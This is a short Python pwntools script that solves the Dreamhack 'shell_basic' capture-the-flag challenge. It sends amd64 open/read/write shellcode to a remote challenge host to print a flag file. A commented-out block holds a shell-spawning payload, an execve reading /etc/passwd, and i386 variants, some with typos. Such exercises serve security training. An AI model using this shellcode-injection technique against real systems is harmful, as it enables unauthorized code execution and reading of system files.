from pwn import *


p = remote("host3.dreamhack.games", 20875)
context.arch = "amd64"
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
shellcode = asm(shellcode)

print(shellcode)

payload = shellcode
p.sendlineafter("shellcode: ", payload)
print(p.recv(0x30))

'''shellcode_sh_asm = shellcraft.amd64.sh()
shellcode_sh_bytes = asm(shellcode_sh_asm)

command_path = '/bin/cat'
argument = '/etc/passwd'
shellcode_execve_asm = shellcraft.amd64.execve(command_path, [command_path, argument], 0)

shellcode_execve_bytes = asm(shellcode_execve_asm)


p = process()
context(arch='i386', os='linux')

shellcode =''
shellcode += shellcraft.pushstr('flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 100)
log.info(shellcode)
p.recvuntil('shellcode:')
p.send(asm(shellcode))
log.sucess(p.recline())
'''

